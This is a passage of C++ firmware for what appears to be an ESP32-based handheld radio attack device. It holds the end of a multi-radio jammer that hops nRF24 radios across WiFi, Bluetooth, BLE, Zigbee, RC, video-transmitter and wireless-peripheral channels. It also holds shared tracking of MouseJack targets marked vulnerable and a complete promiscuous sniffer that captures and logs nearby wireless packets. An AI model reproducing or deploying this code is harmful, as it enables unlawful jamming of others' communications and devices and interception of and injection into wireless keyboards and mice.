    initializeRadios();
    updateTFT();
    printModeChange(currentMode);
  }

  if (modeChangeRequested1) {
    modeChangeRequested1 = false;
    currentMode = static_cast<OperationMode>((currentMode == 0) ? 7 : (currentMode - 1));
    initializeRadios();
    updateTFT();
    printModeChange(currentMode);
  }

  if (jammerToggleRequested) {
    jammerToggleRequested = false;
    jammerActive = !jammerActive;
    initializeRadios();
    updateTFT();
    printJammerStatus(jammerActive);
  }
}

void prokillSetup() {
  setTouchButtonInputEnabled(true);
  bleSetProkillNavLabels();
  bleClearBody(TFT_BLACK);
  Index = 0;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  updateTFT();

  initializeRadios();

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);
#endif

  Print("[+] System Ready!", UI_WARN, true);
  redrawTouchButtonBar();
}

void prokillLoop() {

  // Remapped layout: LEFT exits now (was SELECT).
  if (feature_active && (feature_exit_requested || isButtonPressed(BTN_LEFT))) {
    feature_exit_requested = true;
    return;
  }

  maintainTouchNavBar();
  tft.drawFastHLine(0, 19, 240, UI_LINE);

  checkModeChange();

  if (jammerActive) {
    if (currentMode == BLE_MODULE) {
      int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
      int channel = ble_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == Bluetooth_MODULE) {
      int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
      int channel = bluetooth_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == WiFi_MODULE) {
      int randomIndex = random(0, sizeof(WiFi_channels) / sizeof(WiFi_channels[0]));
      int channel = WiFi_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == USB_WIRELESS_MODULE) {
      int randomIndex = random(0, sizeof(usbWireless_channels) / sizeof(usbWireless_channels[0]));
      int channel = usbWireless_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == VIDEO_TX_MODULE) {
      int randomIndex = random(0, sizeof(videoTransmitter_channels) / sizeof(videoTransmitter_channels[0]));
      int channel = videoTransmitter_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == RC_MODULE) {
      int randomIndex = random(0, sizeof(rc_channels) / sizeof(rc_channels[0]));
      int channel = rc_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == ZIGBEE_MODULE) {
      int randomIndex = random(0, sizeof(zigbee_channels) / sizeof(zigbee_channels[0]));
      int channel = zigbee_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == NRF24_MODULE) {
      int randomIndex = random(0, sizeof(nrf24_channels) / sizeof(nrf24_channels[0]));
      int channel = nrf24_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);
    }
  }

  // Yield to the scheduler so the idle task/watchdog and core-0 radio stack get
  // CPU time; without this the tight loop starves the system and everything lags.
  delay(1);
}

void exit() {
  // Without this, leaving the feature keeps the radios running
  // startConstCarrier(RF24_PA_MAX): a permanent full-power 2.4GHz transmission
  // that jams the ESP32's own WiFi/BLE and makes the whole device sluggish.
  jammerActive = false;
  modeChangeRequested = false;
  modeChangeRequested1 = false;
  jammerToggleRequested = false;
  radio1.powerDown();
  radio2.powerDown();
  radio3.powerDown();
  restoreSdAfterSharedSpi();
}

}  // namespace ProtoKill

// Shared MouseJack targets: scanner publishes, inject consumes.
static constexpr int kMjSharedMax = 12;
struct MjSharedTarget {
  uint8_t addr[5];
  uint8_t channel = 0;
  bool used = false;
  bool vulnerable = false;
  char vendor[12] = {0};
  uint16_t hits = 0;
};
static MjSharedTarget g_mjShared[kMjSharedMax];

static void mjSharedPublish(const uint8_t* addr, uint8_t ch, bool vulnerable, const char* vendor) {
  int idx = -1;
  for (int i = 0; i < kMjSharedMax; i++) {
    if (g_mjShared[i].used && memcmp(g_mjShared[i].addr, addr, 5) == 0) {
      idx = i;
      break;
    }
  }
  if (idx < 0) {
    for (int i = 0; i < kMjSharedMax; i++) {
      if (!g_mjShared[i].used) {
        idx = i;
        break;
      }
    }
    if (idx < 0) {
      idx = 0;
    }
    memset(&g_mjShared[idx], 0, sizeof(MjSharedTarget));
    memcpy(g_mjShared[idx].addr, addr, 5);
    g_mjShared[idx].used = true;
  }
  g_mjShared[idx].channel = ch;
  g_mjShared[idx].hits++;
  if (vulnerable) {
    g_mjShared[idx].vulnerable = true;
  }
  if (vendor && vendor[0]) {
    strncpy(g_mjShared[idx].vendor, vendor, sizeof(g_mjShared[idx].vendor) - 1);
  }
}

static int mjSharedCount() {
  int n = 0;
  for (int i = 0; i < kMjSharedMax; i++) {
    if (g_mjShared[i].used) {
      n++;
    }
  }
  return n;
}

namespace EsbSniffer {

#define CE  NRF24_SCAN_CE
#define CSN NRF24_SCAN_CSN

#define _ESB_CONFIG     0x00
#define _ESB_EN_AA      0x01
#define _ESB_EN_RXADDR  0x02
#define _ESB_SETUP_AW   0x03
#define _ESB_SETUP_RETR 0x04
#define _ESB_RF_CH      0x05
#define _ESB_RF_SETUP   0x06
#define _ESB_STATUS     0x07
#define _ESB_RX_ADDR_P0 0x0A
#define _ESB_RX_PW_P0   0x11
#define _ESB_FIFO_STATUS 0x17

static constexpr int kEsbPayloadMax = 32;
static constexpr int kEsbMaxLogLines = 16;
static constexpr int kEsbStatusLines = 4;
static constexpr int kEsbLineHeight = 12;
static constexpr int kEsbToolbarBottom = 36;
static constexpr int kEsbToolbarGap = 8;
static constexpr int kEsbStatusY = kEsbToolbarBottom + kEsbToolbarGap;
static constexpr int kEsbBoxHeaderH = 15;
static constexpr int kEsbStatusTextY = kEsbStatusY + kEsbBoxHeaderH;
static constexpr int kEsbStatusBoxH = kEsbBoxHeaderH + (kEsbStatusLines * kEsbLineHeight) + 4;
static constexpr int kEsbLogGap = 4;
static constexpr int kEsbLogBoxTop = kEsbStatusY + kEsbStatusBoxH + kEsbLogGap;
static constexpr int kEsbLogStartY = kEsbLogBoxTop + kEsbBoxHeaderH;
static constexpr int kEsbLogBottomPad = 4;
static constexpr uint32_t kEsbFlushIntervalMs = 2000;
static constexpr uint32_t kEsbHopIntervalMs = 80;
static constexpr const char* kEsbDir = "/esb";
static constexpr const char* kEsbFilePrefix = "/esb/esb_";

static bool uiDrawn = false;
static volatile bool sniffing = false;
static uint8_t s_channel = 76;
static bool s_hopping = false;
static bool s_logEnabled = true;
static bool s_sdReady = false;
static bool s_logFileOpen = false;
static String s_logPath;
static File s_logFile;
static uint32_t s_packetTotal = 0;
static uint32_t s_rateCount = 0;
static uint32_t s_rateLastMs = 0;
static uint32_t s_ratePerSec = 0;
static uint32_t s_lastFlushMs = 0;
static uint32_t s_lastHopMs = 0;
static int s_hopIndex = 0;

static String s_logBuffer[kEsbMaxLogLines];
static uint16_t s_logColor[kEsbMaxLogLines];
static int s_logIndex = 0;

static String s_statusText[kEsbStatusLines];
static uint16_t s_statusColor[kEsbStatusLines];
static int s_statusDrawnW[kEsbStatusLines];

static String s_logDrawn[kEsbMaxLogLines];
static uint16_t s_logDrawnColor[kEsbMaxLogLines];
static int s_logDrawnW[kEsbMaxLogLines];

static bool s_esbLogDirty = false;
static bool s_esbStatusDirty = false;
static uint32_t s_esbLastUiMs = 0;
static constexpr uint32_t kEsbUiMinIntervalMs = 100;

static int esbLogBoxBottom() {
  return bleContentBottom() - kEsbLogBottomPad;
}

static int esbLogBoxH() {
  const int h = esbLogBoxBottom() - kEsbLogBoxTop;
  return h > (kEsbBoxHeaderH + kEsbLineHeight) ? h : (kEsbBoxHeaderH + kEsbLineHeight);
}

static int esbLogEndY() {
  return kEsbLogBoxTop + esbLogBoxH() - 2;
}

static int esbVisibleLogLines() {
  const int avail = esbLogEndY() - kEsbLogStartY;
  if (avail <= 0) {
    return 1;
  }
  const int n = avail / kEsbLineHeight;
  if (n < 1) {
    return 1;
  }
  return n > kEsbMaxLogLines ? kEsbMaxLogLines : n;
}

static const uint8_t kHopChannels[] = {
  2, 5, 10, 26, 40, 50, 60, 70, 76, 78, 79, 80, 83
};
static constexpr int kHopCount = sizeof(kHopChannels) / sizeof(kHopChannels[0]);

static const uint8_t kPromiscAddr[5] = {0xAA, 0xAA, 0xAA, 0xAA, 0xAA};

static byte esbGetRegister(byte r) {
  byte c;
  digitalWrite(CSN, LOW);
  SPI.transfer(r & 0x1F);
  c = SPI.transfer(0);
  digitalWrite(CSN, HIGH);
  return c;
}

static void esbSetRegister(byte r, byte v) {
  digitalWrite(CSN, LOW);
  SPI.transfer((r & 0x1F) | 0x20);
  SPI.transfer(v);
  digitalWrite(CSN, HIGH);
}

static void esbWriteRegMulti(uint8_t reg, const uint8_t* data, uint8_t len) {
  digitalWrite(CSN, LOW);
  SPI.transfer((reg & 0x1F) | 0x20);
  for (uint8_t i = 0; i < len; i++) {
    SPI.transfer(data[i]);
  }
  digitalWrite(CSN, HIGH);
}

static void esbDisable() {
  digitalWrite(CE, LOW);
}

static void esbEnable() {
  digitalWrite(CE, HIGH);
}

static void esbPowerUp() {
  esbSetRegister(_ESB_CONFIG, esbGetRegister(_ESB_CONFIG) | 0x02);
  delayMicroseconds(130);
}

static void esbPowerDown() {
  esbSetRegister(_ESB_CONFIG, esbGetRegister(_ESB_CONFIG) & ~0x02);
}

static void esbFlushRx() {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xE2);
  digitalWrite(CSN, HIGH);
}

static void esbInitRadioSpi() {
#if defined(SD_SCLK) && defined(SD_MISO) && defined(SD_MOSI)
  SPI.begin(NRF24_SPI_SCK, NRF24_SPI_MISO, NRF24_SPI_MOSI, NRF24_SPI_SS);
#else
  SPI.begin();
#endif
  SPI.setDataMode(SPI_MODE0);
  SPI.setFrequency(10000000);
  SPI.setBitOrder(MSBFIRST);
}

static void esbApplyChannel(uint8_t ch) {
  esbDisable();
  esbSetRegister(_ESB_RF_CH, ch);
  esbFlushRx();
  esbEnable();
  delayMicroseconds(130);
}

static void esbConfigureRadio() {
  esbDisable();
  esbPowerUp();

  esbWriteRegMulti(_ESB_RX_ADDR_P0, kPromiscAddr, 5);
  esbSetRegister(_ESB_EN_AA, 0x00);
  esbSetRegister(_ESB_EN_RXADDR, 0x01);
  esbSetRegister(_ESB_SETUP_AW, 0x03);
  esbSetRegister(_ESB_SETUP_RETR, 0x00);
  esbSetRegister(_ESB_RF_SETUP, 0x0F);
  esbSetRegister(_ESB_RX_PW_P0, kEsbPayloadMax);
  esbSetRegister(_ESB_CONFIG, 0x0B);

  esbApplyChannel(s_channel);
}

static bool esbSwitchToSdSpi() {
  esbDisable();
  digitalWrite(CSN, HIGH);
#if defined(SD_SCLK) && defined(SD_MISO) && defined(SD_MOSI) && defined(SD_CS)
  SPI.begin(SD_SCLK, SD_MISO, SD_MOSI, SD_CS);
  SPI.setDataMode(SPI_MODE0);
  SPI.setBitOrder(MSBFIRST);
  SPI.setFrequency(4000000);
  return true;
#else
  return false;
#endif
}

static bool esbMountSd() {
  if (!esbSwitchToSdSpi()) {
    return false;
  }
#ifdef SD_CS
  if (SD.begin(SD_CS)) {
    return true;
  }
#endif
#ifdef SD_CS_PIN
#ifdef CC1101_CS
  if (SD_CS_PIN != CC1101_CS && SD.begin(SD_CS_PIN)) {
    return true;
  }
#else
  if (SD.begin(SD_CS_PIN)) {
    return true;
  }
#endif
#endif
  return false;
}

static bool esbEnsureDir() {
  if (!esbMountSd()) {
    return false;
  }
  if (SD.exists(kEsbDir)) {
    return true;
  }
  if (SD.mkdir(kEsbDir)) {
    return true;
  }
  return SD.mkdir("esb");
}

static bool esbMakeNextPath(String& outPath) {
  char buf[40];
  for (uint16_t i = 0; i < 10000; i++) {
    snprintf(buf, sizeof(buf), "%s%04u.log", kEsbFilePrefix, (unsigned)i);
    if (!SD.exists(buf)) {
      outPath = String(buf);
      return true;
    }
  }
  return false;
}

static bool esbOpenLogFile() {
  if (s_logFileOpen) {
    return true;
  }
  if (!esbEnsureDir()) {
    return false;
  }
  if (!esbMakeNextPath(s_logPath)) {
    return false;
  }
  s_logFile = SD.open(s_logPath.c_str(), FILE_WRITE);
  if (!s_logFile) {
    s_logPath = "";
    esbInitRadioSpi();
    esbConfigureRadio();
    return false;
  }
  s_logFile.println("# ESP32-DIV ESB Sniffer");
  s_logFile.println("# format: ms,ch,len,hex");
  s_logFile.flush();
  s_logFileOpen = true;
  esbInitRadioSpi();
  esbConfigureRadio();
  return true;
}

static void esbCloseLogFile() {
  if (s_logFileOpen && s_logFile) {
    if (esbSwitchToSdSpi()) {
      s_logFile.flush();
      s_logFile.close();
    }
    esbInitRadioSpi();
    esbConfigureRadio();
  }
  s_logFileOpen = false;
}

static int esbTrimPayloadLen(const uint8_t* payload, int maxLen) {
  int len = maxLen;
  while (len > 1 && payload[len - 1] == 0x00) {
    len--;
  }
  return len;
}

static String esbPayloadHex(const uint8_t* payload, int len) {
  static char hexBuf[3 * kEsbPayloadMax + 1];
  int pos = 0;
  for (int i = 0; i < len && pos < (int)sizeof(hexBuf) - 3; i++) {
    pos += snprintf(hexBuf + pos, sizeof(hexBuf) - pos, "%02X", payload[i]);
  }
  hexBuf[pos] = '\0';
  return String(hexBuf);
}

static String esbChannelGHzText(uint8_t ch) {
  const uint16_t mhz = (uint16_t)(2400 + ch);
  char buf[10];
  snprintf(buf, sizeof(buf), "%u.%03u", mhz / 1000, mhz % 1000);
  return String(buf);
}

static void esbAppendLogLine(const String& text, uint16_t color) {
  const int visible = esbVisibleLogLines();
  for (int i = visible - 1; i > 0; i--) {
    s_logBuffer[i] = s_logBuffer[i - 1];
    s_logColor[i] = s_logColor[i - 1];
  }
  s_logBuffer[0] = text;
  s_logColor[0] = color;
  if (s_logIndex < visible) {
    s_logIndex++;
  }
  s_esbLogDirty = true;
}

static constexpr int kEsbStatPadX = 10;
static constexpr int kEsbStatValueX = 70;
static constexpr int kEsbStatTextDy = 2;

static void esbPaintTextLine(int x, int y, int maxW, int lineH,
                             String& cacheText, uint16_t& cacheColor, int& cacheW,
                             const String& text, uint16_t color, bool force) {
  if (!force && cacheText == text && cacheColor == color) {
    return;
  }
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  const int newW = text.length() ? (tft.textWidth(text) + 2) : 0;
  int clearW = cacheW > newW ? cacheW : newW;
  if (clearW < 8) {
    clearW = maxW;
  }
  if (clearW > maxW) {
    clearW = maxW;
  }
  tft.fillRect(x, y, clearW, lineH, TFT_BLACK);
  if (text.length()) {
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(x, y + kEsbStatTextDy);
    tft.print(text);
  }
  cacheText = text;
  cacheColor = color;
  cacheW = newW > 0 ? newW : 0;
}

static void esbRedrawLog() {
  const int endY = esbLogEndY();
  const int visible = esbVisibleLogLines();
  const int maxW = tft.width() - 16;
  tft.setTextDatum(TL_DATUM);
  for (int i = 0; i < visible; i++) {
    const int y = kEsbLogStartY + i * kEsbLineHeight;
    if (y + kEsbLineHeight > endY) {
      break;
    }
    if (i < s_logIndex) {
      esbPaintTextLine(kEsbStatPadX, y, maxW, kEsbLineHeight,
                       s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                       s_logBuffer[i], s_logColor[i], false);
    } else {
      esbPaintTextLine(kEsbStatPadX, y, maxW, kEsbLineHeight,
                       s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                       String(""), UI_DIM_TEXT, false);
    }
  }
  s_esbLogDirty = false;
}

static void esbDrawStatusValue(int line, const String& text, uint16_t color) {
  if (line < 0 || line >= kEsbStatusLines) {
    return;
  }
  const int y = kEsbStatusTextY + line * kEsbLineHeight;
  const int maxW = tft.width() - kEsbStatValueX - 8;
  esbPaintTextLine(kEsbStatValueX, y, maxW, kEsbLineHeight,
                   s_statusText[line], s_statusColor[line], s_statusDrawnW[line],
                   text, color, false);
}

static void esbDrawTextBoxes() {
  const int logH = esbLogBoxH();
  const int endY = esbLogEndY();
  tft.fillRect(0, kEsbStatusY - 2, tft.width(), endY - kEsbStatusY + 4, TFT_BLACK);
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
  tft.drawRoundRect(4, kEsbStatusY, tft.width() - 8, kEsbStatusBoxH, 3, UI_LINE);
  tft.drawRoundRect(4, kEsbLogBoxTop, tft.width() - 8, logH, 3, UI_LINE);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(kEsbStatPadX, kEsbStatusY + 3);
  tft.print("Capture");
  tft.setCursor(kEsbStatPadX, kEsbLogBoxTop + 3);
  tft.print("Packets");

  // Fixed label column — values update independently at kEsbStatValueX.
  static const char* kLabels[kEsbStatusLines] = {"Ch", "Pkts", "SD", "Mode"};
  for (int i = 0; i < kEsbStatusLines; i++) {
    const int y = kEsbStatusTextY + i * kEsbLineHeight + kEsbStatTextDy;
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.setCursor(kEsbStatPadX, y);
    tft.print(kLabels[i]);
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < kEsbMaxLogLines; i++) {
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
}

static void esbUpdateStatusPanel() {
  char chVal[28];
  snprintf(chVal, sizeof(chVal), "%u  %s GHz", (unsigned)s_channel,
           esbChannelGHzText(s_channel).c_str());
  esbDrawStatusValue(0, String(chVal), s_hopping ? ORANGE : UI_TEXT);

  char pktVal[28];
  snprintf(pktVal, sizeof(pktVal), "%lu  %lu/s", (unsigned long)s_packetTotal,
           (unsigned long)s_ratePerSec);
  esbDrawStatusValue(1, String(pktVal), s_packetTotal > 0 ? UI_OK : UI_DIM_TEXT);

  if (s_logEnabled && s_sdReady && s_logFileOpen) {
    const int slash = s_logPath.lastIndexOf('/');
    String name = slash >= 0 ? s_logPath.substring(slash + 1) : s_logPath;
    if (name.length() > 18) {
      name = name.substring(0, 18);
    }
    esbDrawStatusValue(2, name, UI_OK);
  } else if (s_logEnabled && !s_sdReady) {
    esbDrawStatusValue(2, "not available", UI_WARN);
  } else {
    esbDrawStatusValue(2, "logging off", UI_DIM_TEXT);
  }

  String mode = s_hopping ? "Hop" : "Fixed";
  mode += sniffing ? "  |  Sniffing" : "  |  Stopped";
  esbDrawStatusValue(3, mode, sniffing ? UI_OK : UI_DIM_TEXT);
  s_esbStatusDirty = false;
}

static void esbFlushUi(bool force = false) {
  const uint32_t now = millis();
  if (!force && (now - s_esbLastUiMs) < kEsbUiMinIntervalMs) {
    return;
  }
  if (!s_esbLogDirty && !s_esbStatusDirty && !force) {
    return;
  }
  s_esbLastUiMs = now;
  if (s_esbStatusDirty || force) {
    esbUpdateStatusPanel();
  }
  if (s_esbLogDirty || force) {
    esbRedrawLog();
  }
}

static void esbWritePacketToSd(uint32_t ts, uint8_t ch, const uint8_t* payload, int len) {
  if (!s_logEnabled || !s_logFileOpen) {
    return;
  }
  if (!esbSwitchToSdSpi()) {
    s_sdReady = false;
    s_logFileOpen = false;
    esbInitRadioSpi();
    esbConfigureRadio();
    return;
  }
  if (s_logFile) {
    s_logFile.print(ts);
    s_logFile.print(',');
    s_logFile.print(ch);
    s_logFile.print(',');
    s_logFile.print(len);
    s_logFile.print(',');
    s_logFile.println(esbPayloadHex(payload, len));
    s_lastFlushMs = millis();
  }
  esbInitRadioSpi();
  esbConfigureRadio();
}

static void esbFlushLogFile() {
  if (!s_logFileOpen || !s_logFile) {
    return;
  }
  if (!esbSwitchToSdSpi()) {
    return;
  }
  s_logFile.flush();
  esbInitRadioSpi();
  esbConfigureRadio();
}

static void esbOnPacket(uint8_t ch, const uint8_t* payload, int len) {
  s_packetTotal++;
  s_rateCount++;

  String preview = "+ ch" + String(ch) + " [" + String(len) + "] " + esbPayloadHex(payload, min(len, 8));
  if (len > 8) {
    preview += "...";
  }
  esbAppendLogLine(preview, UI_TEXT);
  s_esbStatusDirty = true;

  if (s_logEnabled && s_sdReady) {
    esbWritePacketToSd(millis(), ch, payload, len);
  }
}

static bool esbRxAvailable() {
  return (esbGetRegister(_ESB_STATUS) & 0x40) != 0;
}

static void esbReadPacket() {
  uint8_t payload[kEsbPayloadMax];
  digitalWrite(CSN, LOW);
  SPI.transfer(0x61);
  for (int i = 0; i < kEsbPayloadMax; i++) {
    payload[i] = SPI.transfer(0xFF);
  }
  digitalWrite(CSN, HIGH);
  esbSetRegister(_ESB_STATUS, 0x70);

  const int len = esbTrimPayloadLen(payload, kEsbPayloadMax);
  esbOnPacket(s_channel, payload, len);
}

static void esbPollPackets() {
  uint8_t guard = 0;
  while (sniffing && esbRxAvailable() && guard < 8) {
    esbReadPacket();
    guard++;
  }
}

static void esbUpdateRate() {
  const uint32_t now = millis();
  if (now - s_rateLastMs >= 1000) {
    s_ratePerSec = s_rateCount;
    s_rateCount = 0;
    s_rateLastMs = now;
    s_esbStatusDirty = true;
  }
}

static void esbStepHop() {
  if (!s_hopping) {
    return;
  }
  const uint32_t now = millis();
  if (now - s_lastHopMs < kEsbHopIntervalMs) {
    return;
  }
  s_lastHopMs = now;
  s_hopIndex = (s_hopIndex + 1) % kHopCount;
  s_channel = kHopChannels[s_hopIndex];
  esbApplyChannel(s_channel);
  s_esbStatusDirty = true;
}

static void esbChannelDown() {
  if (s_hopping || s_channel == 0) {
    return;
  }
  s_channel--;
  esbApplyChannel(s_channel);
  s_esbStatusDirty = true;
  esbFlushUi(true);
}

static void esbChannelUp() {
  if (s_hopping || s_channel >= 125) {
    return;
  }
  s_channel++;
  esbApplyChannel(s_channel);
  s_esbStatusDirty = true;
  esbFlushUi(true);
}

static void esbToggleHop() {
  s_hopping = !s_hopping;
  if (s_hopping) {
    s_hopIndex = 0;
    s_channel = kHopChannels[0];
    esbApplyChannel(s_channel);
    esbAppendLogLine("[*] Hop enabled", UI_WARN);
  } else {
    esbAppendLogLine("[*] Fixed channel", UI_DIM_TEXT);
  }
  s_esbStatusDirty = true;
  esbFlushUi(true);
}

static void esbToggleLog() {
  s_logEnabled = !s_logEnabled;
  if (s_logEnabled) {
    s_sdReady = esbOpenLogFile();
    if (!s_sdReady) {
      s_logEnabled = false;
      esbAppendLogLine("[!] SD open failed", UI_WARN);
    } else {
      esbAppendLogLine("[+] SD logging on", UI_OK);
    }
  } else {
    esbCloseLogFile();
    esbAppendLogLine("[*] SD logging off", UI_DIM_TEXT);
  }
  s_esbStatusDirty = true;
  esbFlushUi(true);
}

static unsigned long s_esbLastBtnMs = 0;
static constexpr unsigned long kEsbNavDebounceMs = 80;

static void esbWaitNavRelease(int pin) {
  const uint32_t t0 = millis();
  while (isTouchNavButtonPressed(pin) && millis() - t0 < 400) {
    delay(5);
  }
  delay(30);
}

void esbHandleNavButtons() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  const uint32_t now = millis();
  if (now - s_esbLastBtnMs < kEsbNavDebounceMs) {
    return;
  }

  // Remapped layout: SELECT=Hop (the most important action, was on UP with
  // Exit on center), UP=Ch- (was LEFT), DOWN=Ch+ (was RIGHT; Prev/Next-style
  // pairs always sit on UP/DOWN), RIGHT=Log (secondary, was DOWN). LEFT is
  // the universal Exit, handled in esbSnifferLoop(). Also switched from
  // isTouchNavButtonPressedEdge (touch-tap only) to isButtonPressedEdge so
  // the physical buttons actually trigger these actions too.
  if (isButtonPressedEdge(BTN_SELECT)) {
    esbToggleHop();
    s_esbLastBtnMs = millis();
    esbWaitNavRelease(BTN_SELECT);
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    esbToggleLog();
    s_esbLastBtnMs = millis();
    esbWaitNavRelease(BTN_RIGHT);
    return;
  }
  if (isButtonPressedEdge(BTN_UP)) {
    esbChannelDown();
    s_esbLastBtnMs = millis();
    esbWaitNavRelease(BTN_UP);
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    esbChannelUp();
    s_esbLastBtnMs = millis();
    esbWaitNavRelease(BTN_DOWN);
  }
}

static void esbPollNavButtons() {
  esbHandleNavButtons();
}

void runUI() {
  // Avoid Scanner::runUI macros (STATUS_BAR_*, ICON_*) which leak globally.
  static constexpr int kBarY = 20;
  static constexpr int kBarH = 16;
  static constexpr int kIconSz = 16;
  static constexpr int kIconN = 5;
  // Same spacing as BleSpoofer: back @10, then 40px steps from 90.
  static int iconX[kIconN] = {90, 130, 170, 210, 10};
  static int iconY = kBarY;

  static const unsigned char* icons[kIconN] = {
    bitmap_icon_LEFT,
    bitmap_icon_random,
    bitmap_icon_sdcard,
    bitmap_icon_RIGHT,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, kBarY, 240, kBarH, DARK_GRAY);

    for (int i = 0; i < kIconN; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], kIconSz, kIconSz, UI_ICON);
      }
    }
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.drawFastHLine(0, kBarY + kBarH, 240, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], kIconSz, kIconSz, UI_ICON);
      animationState = 2;

      switch (activeIcon) {
        case 0: esbChannelDown(); break;
        case 1: esbToggleHop(); break;
        case 2: esbToggleLog(); break;
        case 3: esbChannelUp(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > kBarY && y < kBarY + kBarH) {
        for (int i = 0; i < kIconN; i++) {
          if (x > iconX[i] && x < iconX[i] + kIconSz) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 4) {
                feature_exit_requested = true;
                sniffing = false;
              } else {
                tft.drawBitmap(iconX[i], iconY, icons[i], kIconSz, kIconSz, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void esbSnifferSetup() {
  setTouchButtonInputEnabled(true);
  bleSetEsbNavLabels();
  bleClearBody(TFT_BLACK);

  uiDrawn = false;
  sniffing = true;
  s_channel = 76;
  s_hopping = false;
  s_logEnabled = true;
  s_sdReady = false;
  s_logFileOpen = false;
  s_logPath = "";
  s_packetTotal = 0;
  s_rateCount = 0;
  s_rateLastMs = millis();
  s_ratePerSec = 0;
  s_lastFlushMs = millis();
  s_lastHopMs = millis();
  s_hopIndex = 0;
  s_logIndex = 0;
  s_esbLogDirty = false;
  s_esbStatusDirty = false;
  s_esbLastUiMs = 0;
  for (int i = 0; i < kEsbMaxLogLines; i++) {
    s_logBuffer[i] = "";
    s_logColor[i] = UI_DIM_TEXT;
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
  for (int i = 0; i < kEsbStatusLines; i++) {
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  runUI();
  esbDrawTextBoxes();
  esbAppendLogLine("[+] ESB sniffer ready", UI_WARN);
  s_esbStatusDirty = true;
  esbFlushUi(true);
  redrawTouchButtonBar();

  setupTouchscreen();

  pinMode(CE, OUTPUT);
  pinMode(CSN, OUTPUT);
  esbInitRadioSpi();
  esbConfigureRadio();

  s_sdReady = esbOpenLogFile();
  if (s_sdReady) {
    esbAppendLogLine("[+] Logging to SD", UI_OK);
  } else {
    esbAppendLogLine("[!] No SD card", UI_WARN);
    s_logEnabled = false;
  }
  s_esbStatusDirty = true;
  esbFlushUi(true);
  redrawTouchButtonBar();
}

void esbSnifferLoop() {
  sniffing = true;
  while (sniffing) {
    // Remapped layout: LEFT exits now (was SELECT).
    if (feature_active && (feature_exit_requested || isButtonPressed(BTN_LEFT))) {
      feature_exit_requested = true;
      sniffing = false;
      break;
    }

    esbPollNavButtons();
    maintainTouchNavBar();
    runUI();
    esbStepHop();
    esbPollPackets();
    esbUpdateRate();
    esbFlushUi(false);

    const uint32_t now = millis();
    if (s_logFileOpen && now - s_lastFlushMs >= kEsbFlushIntervalMs) {
      esbFlushLogFile();
      s_lastFlushMs = now;
    }

    delay(1);
  }
}

void exit() {
  sniffing = false;
  esbDisable();
  esbPowerDown();
  digitalWrite(CSN, HIGH);
  esbCloseLogFile();
  restoreSdAfterSharedSpi();
}

}  // namespace EsbSniffer

namespace EsbReplay {

#define CE  NRF24_SCAN_CE
#define CSN NRF24_SCAN_CSN

#define _RP_CONFIG     0x00
#define _RP_EN_AA      0x01
#define _RP_EN_RXADDR  0x02
#define _RP_SETUP_AW   0x03
